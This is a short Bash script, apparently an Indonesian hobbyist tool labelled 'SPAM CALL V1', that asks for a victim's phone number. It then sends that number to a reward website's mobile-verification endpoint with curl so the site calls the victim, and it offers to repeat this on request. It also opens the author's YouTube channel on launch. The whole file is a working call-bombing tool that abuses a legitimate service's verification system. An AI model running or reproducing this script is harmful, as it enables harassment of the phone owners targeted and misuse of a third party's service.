subrek_anying(){
sleep 1
printf "\033[31m\033[1;30mSUBSCRIBE DULU CHANNEL GUA!!\033[0;m\n"
sleep 1
xdg-open https://m.youtube.com/channel/UCV2VPRvqYODcrPDtihM3ljA
sleep 8
}
m="\033[31;1m"
k="\033[1;33m"
hg="\033[4;32m"
h="\033[32;1m"
b="\033[1;34m"
pu="\033[37;1m"
bi="\033[36;1m"
u="\033[1;35m"
p="\033[0m"
lagi(){
	printf $p"\n[${m}!${p}] ${u}Mau Spam Call Lagi? ${p}[y/n]${m}:${h} " nanya
	read nanya;
	if [[ $nanya == y ]] || [[ $nanya == Y ]]; then
	sleep 1;__main__
	elif [[ $nanya == n ]] || [[ $nanya == N ]]; then
	printf $p"[${m}!${p}] ${m}Exit\n"; exit
	else
	printf $p"[${m}!${p}] ${m}Wrong Input!!\n"
	lagi
	fi
}
__main__(){
sleep 0.5
clear
subrek_anying
clear
sleep 0.1
printf "${u}╔═╗╦═╗╔═╗╔╦╗     ${bi}╔═╗╔═╗╗  ╗";printf "\n${u}╚═╗╠═╝╠═╣║║║ ${m}<${h}•${m}> ${bi}║  ╠═╣║  ║";printf "\n${u}╚═╝╩  ╩ ╩╩ ╩     ${bi}╚═╝╩ ╩╚═╝╚═╝ ${k}V1";printf "\n${b}══════════════════════════════════";printf "\n${b}=${m}[ ${pu}Author ${m}: ${bi}Candra-Oi";printf "\n${b}=${m}[ ${pu}Youtube${m}: ${bi}CANDRA-NM";printf "\n${b}=${m}[ ${pu}Github ${m}: ${hg}github.com/candranovan${p}";printf "\n${b}══════════════════════════════════";sleep 0.1;printf $p"\n[${h}+${p}] ${k}Contoh ${m}: ${p}85xxxxxxxxx\n";gaskeun_lah_anying
}
gaskeun_lah_anying(){
	sleep 0.5
	printf $p"[${h}+${p}] ${k}Target ${m}: ${p}" no
	read no;
	printf $b"══════════════════════════════════"
	url="https://id.jagreward.com/member/verify-mobile/$no"
	gaskeun="curl -s $url"
	sleep 0.1
	printf $p"\n[${h}•${p}] ${bi}Status ${m}: ${pu}"
	$gaskeun
	lagi
}
__main__





